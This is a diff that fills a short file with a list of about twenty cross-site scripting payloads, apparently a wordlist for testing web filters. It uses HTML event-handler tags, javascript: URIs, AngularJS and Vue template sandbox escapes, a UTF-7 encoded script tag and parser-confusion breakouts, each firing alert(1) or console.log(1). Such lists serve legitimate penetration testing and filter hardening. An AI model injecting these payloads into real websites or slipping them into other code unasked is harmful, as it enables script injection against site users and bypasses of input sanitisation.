@@ -1,1 +1,22 @@
-xss
+<xss onfocus=alert(1) autofocus tabindex=1>
+<body onbeforeprint=console.log(1)>
+<audio src/onerror=alert(1)>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<body onload=alert(1)>
+<input onauxclick=alert(1)>
+<input onchange=alert(1) value=xss>
+<details ontoggle=alert(1) open>test</details>
+<embed src="javascript:alert(1)">
+<math><x href="javascript:alert(1)">blah
+constructor.constructor('alert(1)')()
+{{_Vue.h.constructor`alert(1)`()}}
+{{{}.")));alert(1)//"}}
+{{$on.constructor('alert(1)')()}}
+<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>
++/v8+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<form onformdata="alert(1)"><button>Click</button></form>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>
+<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
+
